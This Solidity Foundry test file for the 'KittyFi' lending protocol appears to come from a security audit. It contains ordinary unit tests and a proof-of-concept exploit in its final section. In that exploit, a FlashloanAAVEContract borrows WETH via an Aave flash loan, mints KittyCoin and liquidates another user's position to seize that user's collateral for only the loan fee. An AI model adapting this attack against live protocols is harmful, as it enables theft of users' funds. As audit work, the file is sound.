// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {KittyCoin} from "src/KittyCoin.sol";
import {KittyPool} from "src/KittyPool.sol";
import {KittyVault, IAavePool} from "src/KittyVault.sol";
import {DeployKittyFi, HelperConfig} from "script/DeployKittyFi.s.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {MockV3Aggregator} from "@chainlink/contracts/src/v0.8/tests/MockV3Aggregator.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract KittyFiTest is Test {
    KittyCoin kittyCoin;
    KittyPool kittyPool;
    KittyVault wethVault;
    HelperConfig.NetworkConfig config;
    address weth;
    address meowntainer = makeAddr("meowntainer");
    address user = makeAddr("user");
    uint256 AMOUNT = 10e18;

    function setUp() external {
        HelperConfig helperConfig = new HelperConfig();
        config = helperConfig.getNetworkConfig();
        weth = config.weth;
        deal(weth, user, AMOUNT);

        kittyPool = new KittyPool(
            meowntainer,
            config.euroPriceFeed,
            config.aavePool
        );

        vm.prank(meowntainer);
        kittyPool.meownufactureKittyVault(config.weth, config.ethUsdPriceFeed);

        kittyCoin = KittyCoin(kittyPool.getKittyCoin());
        wethVault = KittyVault(kittyPool.getTokenToVault(config.weth));
    }

    function testConstructorValuesSetUpCorrectly() public view {
        assertEq(address(kittyPool.getMeowntainer()), meowntainer);
        assertEq(address(kittyPool.getKittyCoin()), address(kittyCoin));
        assertEq(address(kittyPool.getTokenToVault(weth)), address(wethVault));
        assertEq(address(kittyPool.getAavePool()), config.aavePool);
    }

    function test_OnlyMeowntainCanAddNewToken() public {
        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);
        ERC20Mock token = new ERC20Mock();
        MockV3Aggregator priceFeed = new MockV3Aggregator(8, 1e8);

        vm.expectRevert(
            abi.encodeWithSelector(
                KittyPool.KittyPool__NotMeowntainerPurrrrr.selector
            )
        );
        kittyPool.meownufactureKittyVault(address(token), address(priceFeed));
        vm.stopPrank();
    }

    function test_MeowntainerAddingTokenSetUpCorrectly() public {
        // initially there is no vault for wbtc
        require(kittyPool.getTokenToVault(config.wbtc) == address(0));

        vm.prank(meowntainer);
        kittyPool.meownufactureKittyVault(config.wbtc, config.btcUsdPriceFeed);

        address vaultCreated = kittyPool.getTokenToVault(config.wbtc);

        require(vaultCreated != address(0), "Vault not created");

        KittyVault _vault = KittyVault(vaultCreated);

        assert(_vault.i_token() == config.wbtc);
        assert(_vault.i_pool() == address(kittyPool));
        assert(address(_vault.i_priceFeed()) == config.btcUsdPriceFeed);
        assert(address(_vault.i_euroPriceFeed()) == config.euroPriceFeed);
        assert(address(_vault.i_aavePool()) == config.aavePool);
        assert(_vault.meowntainer() == meowntainer);
        assert(address(_vault.i_aavePool()) == config.aavePool);
    }

    function test_UserDepositsInVault() public {
        uint256 toDeposit = 5 ether;

        vm.startPrank(user);

        IERC20(weth).approve(address(wethVault), toDeposit);
        kittyPool.depawsitMeowllateral(weth, toDeposit);

        vm.stopPrank();

        assertEq(wethVault.totalMeowllateralInVault(), toDeposit);
        assertEq(wethVault.totalCattyNip(), toDeposit);
        assertEq(wethVault.userToCattyNip(user), toDeposit);
        assertEq(IERC20(weth).balanceOf(address(wethVault)), toDeposit);
    }

    function test_UserDepositsAndMintsKittyCoin() public {
        uint256 toDeposit = 5 ether;
        uint256 amountToMint = 20e18; // 20 KittyCoin

        vm.startPrank(user);

        IERC20(weth).approve(address(wethVault), toDeposit);
        kittyPool.depawsitMeowllateral(weth, toDeposit);

        kittyPool.meowintKittyCoin(amountToMint);

        vm.stopPrank();

        assertEq(kittyPool.getKittyCoinMeownted(user), amountToMint);
    }

    function test_UserWithdrawCollateral() public {
        uint256 toDeposit = 5 ether;

        vm.startPrank(user);

        IERC20(weth).approve(address(wethVault), toDeposit);
        kittyPool.depawsitMeowllateral(weth, toDeposit);

        vm.stopPrank();

        // now user wants to withdraw
        uint256 toWithdraw = 3 ether;

        vm.startPrank(user);

        kittyPool.whiskdrawMeowllateral(weth, toWithdraw);

        vm.stopPrank();

        assertEq(wethVault.totalMeowllateralInVault(), toDeposit - toWithdraw);
        assertEq(wethVault.totalCattyNip(), toDeposit - toWithdraw);
        assertEq(wethVault.userToCattyNip(user), toDeposit - toWithdraw);
        assertEq(
            IERC20(weth).balanceOf(address(wethVault)),
            toDeposit - toWithdraw
        );

        assertEq(IERC20(weth).balanceOf(user), AMOUNT - toDeposit + toWithdraw);
    }

    function test_BurningKittyCoin() public {
        uint256 toDeposit = 5 ether;
        uint256 amountToMint = 20e18; // 20 KittyCoin

        vm.startPrank(user);

        IERC20(weth).approve(address(wethVault), toDeposit);
        kittyPool.depawsitMeowllateral(weth, toDeposit);

        kittyPool.meowintKittyCoin(amountToMint);

        vm.stopPrank();

        // user burns 15 KittyCoin
        uint256 toBurn = 15e18;

        vm.prank(user);
        kittyPool.burnKittyCoin(user, toBurn);

        assert(kittyPool.getKittyCoinMeownted(user) == amountToMint - toBurn);
    }

    modifier userDepositsCollateral() {
        uint256 toDeposit = 5 ether;
        vm.startPrank(user);
        IERC20(weth).approve(address(wethVault), toDeposit);
        kittyPool.depawsitMeowllateral(weth, toDeposit);
        vm.stopPrank();
        _;
    }

    function test_supplyingCollateralToAave() public userDepositsCollateral {
        uint256 totalDepositedInVault = 5 ether;

        // meowntainer transfers collateral in eth vault to Aave to earn interest
        uint256 toSupply = 3 ether;

        vm.prank(meowntainer);
        wethVault.purrrCollateralToAave(toSupply);

        assertEq(
            wethVault.totalMeowllateralInVault(),
            totalDepositedInVault - toSupply
        );

        uint256 totalCollateralBase = wethVault.getTotalMeowllateralInAave();

        assert(totalCollateralBase > 0);
    }

    function test_supplyAndWithdrawCollateralFromAave()
        public
        userDepositsCollateral
    {
        uint256 totalDepositedInVault = 5 ether;

        // meowntainer transfers collateral in eth vault to Aave to earn interest
        uint256 toSupply = 3 ether;

        vm.prank(meowntainer);
        wethVault.purrrCollateralToAave(toSupply);

        // now withdrawing whole collateral deposited

        vm.prank(meowntainer);
        wethVault.purrrCollateralFromAave(toSupply);

        assertEq(wethVault.totalMeowllateralInVault(), totalDepositedInVault);

        assert(wethVault.getTotalMeowllateralInAave() == 0);
    }

    // POC......POC......POC......POC......POC......POC......POC......POC......POC......POC
    using Math for uint256;

    function test_poc_destroykittyProtocol() public {
        // For test, mock wethPriceFeed
        kittyPool = new KittyPool(
            meowntainer,
            config.euroPriceFeed,
            config.aavePool
        );
        // Set the price feed for weth, 2000USD
        MockV3Aggregator wethPriceFeed = new MockV3Aggregator(8, 20000e8);

        vm.prank(meowntainer);
        kittyPool.meownufactureKittyVault(config.weth, address(wethPriceFeed));

        kittyCoin = KittyCoin(kittyPool.getKittyCoin());
        wethVault = KittyVault(kittyPool.getTokenToVault(config.weth));

        address userX = makeAddr("userX");
        uint256 depositedAmount = 0.1 ether; // can adjust based on the avaliable flashloan amount
        deal(weth, userX, depositedAmount);

        // userX deposits 0.1 weth and mint the max kittyCoins
        vm.startPrank(userX);
        IERC20(weth).approve(address(wethVault), depositedAmount);
        kittyPool.depawsitMeowllateral(weth, depositedAmount);
        uint256 amountToMint = getAlmostMaxKittyToken(userX);
        kittyPool.meowintKittyCoin(amountToMint);
        vm.stopPrank();

        console.log();
        showUserCOLLATERALPERCENT(kittyPool, userX);
        // Mock eth price change, make userX's COLLATERAL_PERCENT under 169

        // Make userX's COLLATERAL_PERCENT below 169,
        // Actually, if one user's COLLATERAL_PERCENT is closest to 169, it's very easy to under 169, and the attacker can liquidate the user's collateral.
        wethPriceFeed.updateAnswer(18000e8);
        showUserCOLLATERALPERCENT(kittyPool, userX);
        uint256 attackerMaxAmount = calLiquidatorExpectedReceAmount(
            kittyPool,
            userX
        );
        console.log(
            "If the userX is under liquidated status, Based on current price,The maxCollateral attakcer can get from the portocol ",
            attackerMaxAmount
        );

        FlashloanAAVEContract attacker = new FlashloanAAVEContract(
            address(weth),
            address(wethVault.i_aavePool()),
            address(wethVault.i_pool()),
            userX
        );

        uint128 FLASHLOAN_PREMIUM_TOTAL = IAavePool(wethVault.i_aavePool())
            .FLASHLOAN_PREMIUM_TOTAL();
        uint256 fee = (attackerMaxAmount * uint256(FLASHLOAN_PREMIUM_TOTAL)) /
            uint256(10000);
        console.log("fee,", fee);
        deal(weth, address(attacker), fee);

        attacker.attack(attackerMaxAmount);

        console.log(
            "attacker just pay fee(weth)",
            fee,
            "get kittyCoins",
            kittyCoin.balanceOf(address(attacker))
        );

        // showMeowllateralInfo(address(attacker));
    }

    function showUserCOLLATERALPERCENT(
        KittyPool kittyPool,
        address user
    ) internal {
        (, int256 collateralToUsdPrice, , , ) = AggregatorV3Interface(
            KittyVault(kittyPool.getTokenToVault(weth)).i_priceFeed()
        ).latestRoundData();

        uint256 totalCollateralInEuros = kittyPool.getUserMeowllateralInEuros(
            user
        );
        // console.log("totalCollateralInEuros", totalCollateralInEuros);
        uint256 collateralRequiredInEuros = kittyPool.getKittyCoinMeownted(
            user
        );
        console.log("collateralToUsdPrice", collateralToUsdPrice);
        // console.log("collateralRequiredInEuros", collateralRequiredInEuros);
        console.log(
            "userX COLLATERALPERCENT",
            (totalCollateralInEuros * 100) / collateralRequiredInEuros
        );
    }

    // based on current price, calculating how much reward  the attacker can get
    // Just based on one valut scenario
    function calLiquidatorExpectedReceAmount(
        KittyPool kittyPool,
        address liquidatedUser
    ) internal returns (uint256 totalAmountReceived) {
        uint256 PRECISION = 1e18;
        uint256 REWARD_PERCENT = 0.05e18;
        uint256 userMeowllateralInEuros = kittyPool.getUserMeowllateralInEuros(
            liquidatedUser
        );
        uint256 totalDebt = kittyPool.getKittyCoinMeownted(liquidatedUser);

        uint256 redeemPercent;

        if (totalDebt >= userMeowllateralInEuros) {
            redeemPercent = PRECISION;
        } else {
            redeemPercent = totalDebt.mulDiv(
                PRECISION,
                userMeowllateralInEuros
            );
        }

        uint256 vaultCollateral = wethVault.getUserVaultMeowllateralInEuros(
            liquidatedUser
        );
        uint256 toDistribute = vaultCollateral.mulDiv(redeemPercent, PRECISION);
        uint256 extraCollateral = vaultCollateral - toDistribute;

        uint256 extraReward = toDistribute.mulDiv(REWARD_PERCENT, PRECISION);
        extraReward = Math.min(extraReward, extraCollateral);
        totalAmountReceived = (toDistribute + extraReward);
    }

    function getAlmostMaxKittyToken(
        address user
    ) internal view returns (uint256) {
        return (wethVault.getUserVaultMeowllateralInEuros(user) * 100) / 169;
    }

    // POC......POC......POC......POC......POC......POC......POC......POC......POC......POC
}

//
import "@aave-v3-core/contracts/flashloan/interfaces/IFlashLoanSimpleReceiver.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {AggregatorV3Interface} from "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract FlashloanAAVEContract is IFlashLoanSimpleReceiver {
    using Math for uint256;
    IERC20 weth;
    IAavePool aavePool;
    KittyPool kittyPool;
    KittyVault wethVault;
    address userX;
    KittyCoin kittyCoin;

    constructor(
        address _wethAddress,
        address _aavePoolAddress,
        address _kittyPoolAddress,
        address _userX
    ) public {
        weth = IERC20(_wethAddress);
        aavePool = IAavePool(_aavePoolAddress);
        kittyPool = KittyPool(_kittyPoolAddress);
        wethVault = KittyVault(kittyPool.getTokenToVault(_wethAddress));
        userX = _userX;
        kittyCoin = KittyCoin(kittyPool.getKittyCoin());
    }

    function attack(uint256 attackerMaxAmount) public {
        console.log(
            "attakcer collateral amount",
            weth.balanceOf(address(this))
        );
        console.log(
            "attakcer kittyCoins balance",
            kittyCoin.balanceOf(address(this))
        );
        aavePool.flashLoanSimple(
            address(this),
            address(weth),
            attackerMaxAmount,
            "",
            0
        );
        console.log(
            "after flasloan attakcer collateral amount",
            weth.balanceOf(address(this))
        );
        console.log(
            "after flasloan attakcer kittyCoins balance",
            kittyCoin.balanceOf(address(this))
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        console.log("attacker recevied flashloan amount", amount);
        IERC20(weth).approve(address(wethVault), amount);
        // Make the flashloan borrow amount as the deposited collateral.
        kittyPool.depawsitMeowllateral(address(weth), amount);
        console.log("attacker deposited these collateral to the kittyFi");
        uint256 maxMintedKittyCoins = getAlmostMaxKittyToken();
        kittyPool.meowintKittyCoin(maxMintedKittyCoins);
        console.log(
            "Based on the attacker's deposited collateral, attacker minted kittyCoins",
            maxMintedKittyCoins
        );

        console.log(
            "current attacker and userX's kittyCoins balance",
            kittyCoin.balanceOf(address(this)),
            kittyCoin.balanceOf(userX)
        );
        console.log("attakcer liquidated userX's bad debt");
        kittyPool.purrgeBadPawsition(userX);
        console.log("attakcer liquidation logic end");

        console.log(
            "attacker current collateral amount",
            weth.balanceOf(address(this))
        );
        console.log("attacker return flashloan");

        weth.approve(address(aavePool), amount + premium);
        return true;
    }

    function getAlmostMaxKittyToken() internal view returns (uint256) {
        return
            (wethVault.getUserVaultMeowllateralInEuros(address(this)) * 100) /
            169;
    }

    function ADDRESSES_PROVIDER()
        external
        view
        returns (IPoolAddressesProvider)
    {
        return IPoolAddressesProvider(address(aavePool));
    }

    function POOL() external view returns (IPool) {
        return IPool(address(aavePool));
    }
}
